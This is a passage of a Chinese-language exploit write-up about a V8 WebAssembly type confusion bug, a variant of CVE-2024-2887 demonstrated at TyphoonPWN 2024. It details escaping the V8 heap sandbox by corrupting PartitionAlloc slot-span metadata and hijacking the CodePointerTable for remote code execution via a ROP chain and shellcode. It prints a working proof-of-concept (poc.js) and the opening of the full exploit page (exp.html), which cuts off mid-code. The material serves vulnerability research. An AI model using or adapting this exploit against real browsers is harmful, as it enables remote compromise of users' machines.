      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">IsSmi</span><span class="token punctuation">(</span><span class="token operator">*</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token function">CanonicalizeSmi</span><span class="token punctuation">(</span>value<span class="token punctuation">,</span> isolate<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">IsHeapNumber</span><span class="token punctuation">(</span><span class="token operator">*</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token function">CanonicalizeHeapNumber</span><span class="token punctuation">(</span>value<span class="token punctuation">,</span> isolate<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">IsNull</span><span class="token punctuation">(</span><span class="token operator">*</span>value<span class="token punctuation">,</span> isolate<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> value<span class="token punctuation">;</span>
      <span class="token operator">*</span>error_message <span class="token operator">=</span> <span class="token string">"null is not allowed for (ref any)"</span><span class="token punctuation">;</span>
      <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token comment">//...</span>
  <span class="token punctuation">&#125;</span>
  <span class="token comment">//...</span>
<span class="token punctuation">&#125;</span></code></pre>
<p>这导致了第二个更简单的漏洞——JS-to-Wasm 类型检查将（截断的）规范类型 id 混淆为<code>wasm::HeapType</code>。这允许所有具有规范类型 id 的类型<code>tn = kAny + 0x100000 * n</code>（其中<code>kAny = 1000005</code>）允许 的所有子类型<code>any</code>，并且由于<code>any</code>是顶级类型，因此它包括所有内容（除了 null，我们无论如何都不需要它）。</p>
<p>我们有一个非常简单但强大的利用原语，因为我们在 WASM 对象之间有任意类型混淆。利用这一点来获取基本的漏洞构造（例如，笼状 RW、）<code>addrOf()</code>，<code>fakeObj()</code>在 <a target="_blank" rel="noopener" href="https://www.zerodayinitiative.com/blog/2024/5/2/cve-2024-2887-a-pwn2own-winning-bug-in-google-chrome">https://www.zerodayinitiative.com/blog/2024/5/2/cve-2024-2887-a-pwn2own-winning-bug-in-google-chrome</a> 中有很好的解释——简短的总结就是造成<code>(type $t1 (struct (mut i32)))</code>、<code>(type $t2 (struct (ref $t1)))</code>和之间的混淆<code>(type $t3 (struct (exnref)))</code>（每个都对应于<code>int</code>,<code>int*</code>,<code>jsobj</code>)<br>现在剩下的就是逃离 v8 堆沙箱。与缺乏公开的技术相反，逃离 v8 堆沙箱似乎仍然是一项简单的任务 - 滥用 PartitionAlloc。</p>
<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h4 id="滥用-PartitionAlloc-元数据进行任意地址写入"><a href="#滥用-PartitionAlloc-元数据进行任意地址写入" class="headerlink" title="滥用 PartitionAlloc 元数据进行任意地址写入"></a>滥用 PartitionAlloc 元数据进行任意地址写入</h4><p>PartitionAlloc 似乎是 v8 堆沙箱逃逸的一个未经充分研究的攻击向量，可能是因为它不包含在 4GB v8 指针压缩框架中。然而，它仍然在 1TB v8 堆沙箱中，很容易访问（指针压缩框架 &lt;-&gt; 堆沙箱不是安全边界），并且有大量的外部指针，这些指针可以直接使用，而没有任何有意义的缓解措施。</p>
<p>通过修改<code>ArrayBuffer</code>对象字段（通过<code>addrOf()</code>+ <code>caged_write()</code>），特别是<code>backing_store</code>字段，很容易获得对 PartitionAlloc 元数据的控制权。这会立即导致<code>chrome.dll</code>地址泄漏<code>SlotSpanMetadata::bucket</code>。</p>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">SlotSpanMetadata</span> <span class="token punctuation">&#123;</span>
 private<span class="token operator">:</span>
  PartitionFreelistEntry<span class="token operator">*</span> freelist_head <span class="token operator">=</span> nullptr<span class="token punctuation">;</span>

 public<span class="token operator">:</span>
  <span class="token comment">// TODO(lizeb): Make as many fields as possible private or const, to</span>
  <span class="token comment">// encapsulate things more clearly.</span>
  SlotSpanMetadata<span class="token operator">*</span> next_slot_span <span class="token operator">=</span> nullptr<span class="token punctuation">;</span>
  PartitionBucket<span class="token operator">*</span> <span class="token keyword">const</span> bucket <span class="token operator">=</span> nullptr<span class="token punctuation">;</span>                                        <span class="token comment">// [!] chrome.dll address leak</span>

  <span class="token comment">// CHECK()ed in AllocNewSlotSpan().</span>
  <span class="token comment">// The maximum number of bits needed to cover all currently supported OSes.</span>
  <span class="token keyword">static</span> constexpr <span class="token class-name">size_t</span> kMaxSlotsPerSlotSpanBits <span class="token operator">=</span> <span class="token number">13</span><span class="token punctuation">;</span>
  <span class="token function">static_assert</span><span class="token punctuation">(</span>kMaxSlotsPerSlotSpan <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> kMaxSlotsPerSlotSpanBits<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token comment">// |marked_full| isn't equivalent to being full. Slot span is marked as full</span>
  <span class="token comment">// iff it isn't on the active slot span list (or any other list).</span>
  <span class="token class-name">uint32_t</span> marked_full <span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">;</span>
  <span class="token comment">// |num_allocated_slots| is 0 for empty or decommitted slot spans, which can</span>
  <span class="token comment">// be further differentiated by checking existence of the freelist.</span>
  <span class="token class-name">uint32_t</span> num_allocated_slots <span class="token operator">:</span> kMaxSlotsPerSlotSpanBits<span class="token punctuation">;</span>
  <span class="token class-name">uint32_t</span> num_unprovisioned_slots <span class="token operator">:</span> kMaxSlotsPerSlotSpanBits<span class="token punctuation">;</span>

 private<span class="token operator">:</span>
  <span class="token keyword">const</span> <span class="token class-name">uint32_t</span> can_store_raw_size_ <span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">;</span>
  <span class="token class-name">uint32_t</span> freelist_is_sorted_ <span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">;</span>
  <span class="token class-name">uint32_t</span> unused1_ <span class="token operator">:</span> <span class="token punctuation">(</span><span class="token number">32</span> <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">-</span> <span class="token number">2</span> <span class="token operator">*</span> kMaxSlotsPerSlotSpanBits <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token comment">// If |in_empty_cache_|==1, |empty_cache_index| is undefined and mustn't be</span>
  <span class="token comment">// used.</span>
  <span class="token class-name">uint16_t</span> in_empty_cache_ <span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">;</span>
  <span class="token class-name">uint16_t</span> empty_cache_index_
      <span class="token operator">:</span> kMaxEmptyCacheIndexBits<span class="token punctuation">;</span>  <span class="token comment">// &lt; kMaxFreeableSpans.</span>
  <span class="token class-name">uint16_t</span> unused2_ <span class="token operator">:</span> <span class="token punctuation">(</span><span class="token number">16</span> <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">-</span> kMaxEmptyCacheIndexBits<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token comment">// Can use only 48 bits (6B) in this bitfield, as this structure is embedded</span>
  <span class="token comment">// in PartitionPage which has 2B worth of fields and must fit in 32B.</span>
  <span class="token comment">//...</span>
<span class="token punctuation">&#125;</span></code></pre>
<p>由于<code>bucket</code>稍后会取消引用并写入，因此我们将目标锁定在该字段。下面是释放对象的代码片段：</p>
<pre class="language-c" data-language="c"><code class="language-c">PA_ALWAYS_INLINE <span class="token keyword">void</span> SlotSpanMetadata<span class="token operator">::</span><span class="token function">Free</span><span class="token punctuation">(</span>
    <span class="token class-name">uintptr_t</span> slot_start<span class="token punctuation">,</span>
    PartitionRoot<span class="token operator">*</span> root<span class="token punctuation">,</span>
    <span class="token keyword">const</span> PartitionFreelistDispatcher<span class="token operator">*</span> freelist_dispatcher<span class="token punctuation">)</span>
    <span class="token comment">// PartitionRootLock() is not defined inside partition_page.h, but</span>
    <span class="token comment">// static analysis doesn't require the implementation.</span>
    <span class="token function">PA_EXCLUSIVE_LOCKS_REQUIRED</span><span class="token punctuation">(</span><span class="token function">PartitionRootLock</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token comment">//...</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">PA_UNLIKELY</span><span class="token punctuation">(</span>marked_full <span class="token operator">||</span> num_allocated_slots <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">FreeSlowPath</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                            <span class="token comment">// [!] target path</span>
  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// All single-slot allocations must go through the slow path to</span>
    <span class="token comment">// correctly update the raw size.</span>
    <span class="token function">PA_DCHECK</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">CanStoreRawSize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> SlotSpanMetadata<span class="token operator">::</span><span class="token function">FreeSlowPath</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> number_of_freed<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token comment">//...</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>marked_full<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">//...</span>
    marked_full <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token comment">//...</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">PA_LIKELY</span><span class="token punctuation">(</span>bucket<span class="token operator">-></span>active_slot_spans_head <span class="token operator">!=</span> <span class="token function">get_sentinel_slot_span</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      next_slot_span <span class="token operator">=</span> bucket<span class="token operator">-></span>active_slot_spans_head<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    bucket<span class="token operator">-></span>active_slot_spans_head <span class="token operator">=</span> this<span class="token punctuation">;</span>                      <span class="token comment">// [!] arbitrary address write</span>
    <span class="token function">PA_CHECK</span><span class="token punctuation">(</span>bucket<span class="token operator">-></span>num_full_slot_spans<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// Underflow.       // [!] constraint</span>
    <span class="token operator">--</span>bucket<span class="token operator">-></span>num_full_slot_spans<span class="token punctuation">;</span>                              <span class="token comment">// [!] arbitrary address decr (24bit int)</span>
  <span class="token punctuation">&#125;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">PA_LIKELY</span><span class="token punctuation">(</span>num_allocated_slots <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">//...</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">PA_LIKELY</span><span class="token punctuation">(</span>this <span class="token operator">==</span> bucket<span class="token operator">-></span>active_slot_spans_head<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      bucket<span class="token operator">-></span><span class="token function">SetNewActiveSlotSpan</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token comment">//...</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

bool PartitionBucket<span class="token operator">::</span><span class="token function">SetNewActiveSlotSpan</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token comment">//...</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span> slot_span<span class="token punctuation">;</span> slot_span <span class="token operator">=</span> next_slot_span<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    next_slot_span <span class="token operator">=</span> slot_span<span class="token operator">-></span>next_slot_span<span class="token punctuation">;</span>                 <span class="token comment">// [!] constraint: target should be zero</span>
    <span class="token comment">//...</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>slot_span<span class="token operator">-></span><span class="token function">is_active</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                               <span class="token comment">// [!] constraint: false on zeros</span>
      <span class="token comment">//...</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>slot_span<span class="token operator">-></span><span class="token function">is_empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                         <span class="token comment">// [!] arbitrary write</span>
      slot_span<span class="token operator">-></span>next_slot_span <span class="token operator">=</span> empty_slot_spans_head<span class="token punctuation">;</span>
      empty_slot_spans_head <span class="token operator">=</span> slot_span<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">PA_LIKELY</span><span class="token punctuation">(</span>slot_span<span class="token operator">-></span><span class="token function">is_decommitted</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      slot_span<span class="token operator">-></span>next_slot_span <span class="token operator">=</span> decommitted_slot_spans_head<span class="token punctuation">;</span>  <span class="token comment">// [!] arbitrary write</span>
      decommitted_slot_spans_head <span class="token operator">=</span> slot_span<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
      <span class="token comment">//...</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token comment">//...</span>
<span class="token punctuation">&#125;</span></code></pre>
<p>通过修改<code>bucket</code>字段并设置<code>marked_full</code>slot span 元数据中的位，我们可以到达代码中，在<code>FreeSlowPath()</code>那里我们可以实现任意地址写入，写入的值是元数据地址。请注意立即数<code>PA_CHECK()</code>- 这是我们的目标地址必须满足的约束。随后立即进行任意地址递减，也可以根据需要使用（例如从<code>CodePointerTables</code> 中移出 JIT 代码地址）。</p>
<p>这个原语可以用来做任何我们想做的事情，甚至可以凭空创造出完全任意的值——一旦<code>PA_CHECK()</code>相邻的更高地址满足了约束，我们甚至可以通过反复将值逐一减少来“拉”到我们想要写入的位置，然后反复触发减少以创建任意值。</p>
<p>我们还可以采用<code>PartitionBucket::SetNewActiveSlotSpan()</code>路径，其中这是攻击者控制的<code>PartitionBucket*</code>。这允许在已经写入NULL的目标指针上使用任意值进行任意写入(加上一些容易满足的约束)。当我们希望在一个巨大的零区域的中间写入任意值，而<code>PA_CHECK(bucket-&gt;num_full_slot_spans)</code>可能难以满足时，这将补充上述原语。</p>
<h4 id="Popping-Shell"><a href="#Popping-Shell" class="headerlink" title="Popping Shell"></a>Popping Shell</h4><p>我们已经通过任意地址写入原语绕过了 v8sbx，剩下的就是使用漏洞原语来弹出 shell。</p>
<p><code>CodePointerTable</code>通过劫持位于对象前方的程序即可获得完整的 RCE <code>Sandbox</code>。</p>
<ol>
<li>按要求准备ropchain、shellcode等</li>
<li>将 CPT 函数表基覆盖到我们控制的 ArrayBuffer 中，并用我们的 pivot gadget 填充</li>
<li>触发代码，通过 CPT 调用数据透视小工具（JSEntry()这是最简单的一个）</li>
</ol>
<ul>
<li>Gadget 将堆栈转到 ropchain，将 shellcode 区域设置为可执行文件并返回到 shellcode<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// poc.js</span>
<span class="token comment">// kNumberOfPredefinedTypes = 2</span>

<span class="token comment">// stack up 1000000 more canonicalized types (total 1000002)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">const</span> builder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WasmModuleBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  builder<span class="token punctuation">.</span><span class="token function">startRecGroup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">1000000</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    builder<span class="token punctuation">.</span><span class="token function">addArray</span><span class="token punctuation">(</span>kWasmI64<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  builder<span class="token punctuation">.</span><span class="token function">endRecGroup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  builder<span class="token punctuation">.</span><span class="token function">instantiate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">// confuse argument as struct (mut i32) by aliasing canonicalized type with kAny</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">let</span> builder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WasmModuleBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  builder<span class="token punctuation">.</span><span class="token function">startRecGroup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  builder<span class="token punctuation">.</span><span class="token function">addArray</span><span class="token punctuation">(</span>kWasmI64<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1000002</span>
  builder<span class="token punctuation">.</span><span class="token function">addArray</span><span class="token punctuation">(</span>kWasmI64<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1000003</span>
  builder<span class="token punctuation">.</span><span class="token function">addArray</span><span class="token punctuation">(</span>kWasmI64<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1000004</span>
  <span class="token keyword">let</span> struct <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">addStruct</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token function">makeField</span><span class="token punctuation">(</span>kWasmI32<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1000005 &lt;- kAny</span>
  <span class="token keyword">let</span> funcSig <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">addType</span><span class="token punctuation">(</span><span class="token function">makeSig</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token function">wasmRefType</span><span class="token punctuation">(</span>struct<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>kWasmI32<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1000006</span>
  builder<span class="token punctuation">.</span><span class="token function">endRecGroup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  builder
    <span class="token punctuation">.</span><span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">"read"</span><span class="token punctuation">,</span> funcSig<span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">addBody</span><span class="token punctuation">(</span><span class="token punctuation">[</span>
      kExprLocalGet<span class="token punctuation">,</span>
      <span class="token number">0</span><span class="token punctuation">,</span>
      kGCPrefix<span class="token punctuation">,</span>
      kExprStructGet<span class="token punctuation">,</span>
      struct<span class="token punctuation">,</span>
      <span class="token operator">...</span><span class="token function">wasmUnsignedLeb</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">exportFunc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">const</span> instance <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">instantiate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">const</span> wasm <span class="token operator">=</span> instance<span class="token punctuation">.</span>exports<span class="token punctuation">;</span>

  <span class="token comment">// this should obviously fail, instead of reading from the given JS object (or smi)</span>
  <span class="token comment">// instead we segfault on the smi as caged offset</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>wasm<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">// FromJS / WasmJSToWasmObject is mistaking canonicalized type indexes as normal type indexes.</span>
<span class="token comment">// This confusion also results in the value to be truncated to 20bits (= 0x100000 = 1048576) since</span>
<span class="token comment">//  ValueType is used to represent the type indexes, so we can even cycle back to 0 and create more</span>
<span class="token comment">//  types that are confused as kAny.</span>
<span class="token comment">// => Arbitrary WASM type confusion, variant of @_manfp's CVE-2024-2887 at Pwn2Own Vancouver 2024</span></code></pre>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!-- exp.html --></span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>TyphoonPWN 2024 Exploit<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>textarea</span>
      <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>log<span class="token punctuation">"</span></span>
      <span class="token attr-name">rows</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>30<span class="token punctuation">"</span></span>
      <span class="token attr-name">cols</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>120<span class="token punctuation">"</span></span>
      <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>
        font-family: Consolas, Monaco, Lucida Console, Liberation Mono,
          DejaVu Sans Mono, Bitstream Vera Sans Mono, Courier New, monospace;
      <span class="token punctuation">"</span></span></span>
    <span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>textarea</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
      <span class="token comment">// Copyright 2016 the V8 project authors. All rights reserved.</span>
      <span class="token comment">// Use of this source code is governed by a BSD-style license that can be</span>
      <span class="token comment">// found in the LICENSE file.</span>
      <span class="token comment">// Used for encoding f32 and double constants to bits.</span>
      <span class="token keyword">let</span> byte_view <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint8Array</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> data_view <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DataView</span><span class="token punctuation">(</span>byte_view<span class="token punctuation">.</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token comment">// The bytes function receives one of</span>
      <span class="token comment">//  - several arguments, each of which is either a number or a string of length</span>
      <span class="token comment">//    1; if it's a string, the charcode of the contained character is used.</span>
      <span class="token comment">//  - a single array argument containing the actual arguments</span>
      <span class="token comment">//  - a single string; the returned buffer will contain the char codes of all</span>
      <span class="token comment">//    contained characters.</span>
      <span class="token keyword">function</span> <span class="token function">bytes</span><span class="token punctuation">(</span><span class="token parameter"><span class="token operator">...</span>input</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>input<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">typeof</span> input<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"array"</span><span class="token punctuation">)</span> input <span class="token operator">=</span> input<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>input<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">typeof</span> input<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"string"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">let</span> len <span class="token operator">=</span> input<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>length<span class="token punctuation">;</span>
          <span class="token keyword">let</span> view <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint8Array</span><span class="token punctuation">(</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> view<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> input<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">return</span> view<span class="token punctuation">.</span>buffer<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">let</span> view <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint8Array</span><span class="token punctuation">(</span>input<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> input<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">let</span> val <span class="token operator">=</span> input<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> val <span class="token operator">==</span> <span class="token string">"string"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>val<span class="token punctuation">.</span>length <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
              <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"string inputs must have length 1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            val <span class="token operator">=</span> val<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">&#125;</span>
          view<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> val <span class="token operator">|</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> view<span class="token punctuation">.</span>buffer<span class="token punctuation">;</span>
